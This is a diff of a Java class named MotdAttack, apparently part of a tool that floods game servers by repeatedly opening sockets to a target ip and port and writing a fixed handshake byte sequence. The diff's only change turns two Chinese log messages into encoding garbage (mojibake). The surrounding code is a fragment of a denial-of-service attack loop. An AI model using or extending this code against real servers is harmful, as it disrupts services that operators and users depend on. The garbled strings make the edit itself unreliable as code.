@@ -25,7 +25,7 @@ public class MotdAttack extends IAttack {
 					Socket socket = new Socket();
 					socket.connect(new InetSocketAddress(ip,port));
 					if(socket.isConnected()) {
-						Utils.log("Motd/"+Thread.currentThread().getName(),"连接成功");
+						Utils.log("Motd/"+Thread.currentThread().getName(),"杩炴帴鎴愬姛");
 						OutputStream out = socket.getOutputStream();
 						out.write(new byte[] {0x07,0x00,0x05,0x01,0x30,0x63,(byte)0xDD,0x01});
 						out.flush();
@@ -39,7 +39,7 @@ public class MotdAttack extends IAttack {
 							out.close();
 							socket.close();
 						} catch (IOException e) {}
-						Utils.log("Motd/"+Thread.currentThread().getName(),"已断开");
+						Utils.log("Motd/"+Thread.currentThread().getName(),"宸叉柇寮�");
 						Utils.sleep(1000);
 					}
 				} catch (Exception e) {
